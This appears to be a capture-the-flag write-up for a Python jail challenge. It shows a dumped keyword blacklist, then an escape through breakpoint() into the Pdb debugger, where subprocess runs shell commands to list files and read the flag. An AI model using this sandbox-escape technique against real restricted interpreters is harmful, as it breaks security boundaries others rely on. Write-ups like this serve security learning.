# Baby's First Pyjail [295 Solves]

## Description

> @windex told me that jails should be sourceless. So no source for you.
>
> Author: SteakEnthusiast
>
> `nc 35.226.249.45 5000`

## Solution

```console
$ nc 35.226.249.45 5000
>>> os
try harder
>>> import
try harder
>>> system
try harder
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fc5a42fbc10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctfuser/app/chal.py', '__cached__': None, 'blacklist': ['import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.'], 'cmd': 'print(globals())', 'i': '.'}
```

It's Python interpreter and `import`, `os` and `system`, etc... is not allowed by blacklist.
However, [breakpoint](https://docs.python.org/3/library/functions.html#breakpoint) can be used.

```python
>>> breakpoint()  # change from restricted Python interpreter to Pdb debugger
--Return--
(Pdb) import subprocess
(Pdb) subprocess.run("ls -la", shell=True, capture_output=True).stdout
b'total 16\ndr-xr-xr-x 2 nobody nogroup 4096 Jan 13 00:50 .\ndrwxr-xr-x 3 nobody nogroup 4096 Jan 13 00:50 ..\n-r-xr-xr-x 1 nobody nogroup  321 Jan 13 00:49 chal.py\n-r-xr-xr-x 1 nobody nogroup   34 Jan 13 00:50 flag\n'
(Pdb) subprocess.run("cat flag", shell=True, capture_output=True)
CompletedProcess(args='cat flag', returncode=0, stdout=b'uoftctf{you_got_out_of_jail_free}\n', stderr=b'')
```

## Flag

uoftctf{you_got_out_of_jail_free}
